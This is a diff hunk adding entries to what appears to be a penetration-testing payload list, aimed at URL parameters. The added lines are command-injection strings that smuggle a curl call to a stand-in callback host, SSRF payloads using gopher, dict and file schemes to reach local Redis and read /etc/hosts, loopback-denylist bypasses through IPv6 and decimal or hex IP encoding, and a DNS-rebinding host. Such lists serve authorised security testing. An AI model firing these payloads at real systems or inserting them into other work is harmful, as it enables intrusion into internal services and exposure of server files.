@@ -1070,3 +1070,21 @@ zoom, teams, slack, lync, sip, voice, meet,
 |---|---|---|
 |---|---|---|---|
 }
+# ?url= RCE — test cmd-injection BEFORE SSRF: many URL parsers pass to shell
+http://x";curl${IFS}BURP_COLLAB;#
+http://x`curl${IFS}BURP_COLLAB`
+http://x$(curl${IFS}BURP_COLLAB)
+# gopher scheme — sometimes reaches raw TCP even when http:// is filtered
+gopher://127.0.0.1:6379/_INFO
+# dict scheme — Redis/memcached readable without needing HTTP wrapping
+dict://127.0.0.1:6379/INFO
+# file scheme — often overlooked when http:// is blocked
+file:///etc/hosts
+# 0.0.0.0 vs 127.0.0.1 — bypass loopback denylists
+http://[::1]/
+http://[::ffff:127.0.0.1]/
+# decimal / hex IP encoding
+http://2130706433/
+http://0x7f000001/
+# DNS rebinding — CNAME to attacker-controlled TTL=0 record
+http://rebind.attacker.tld/
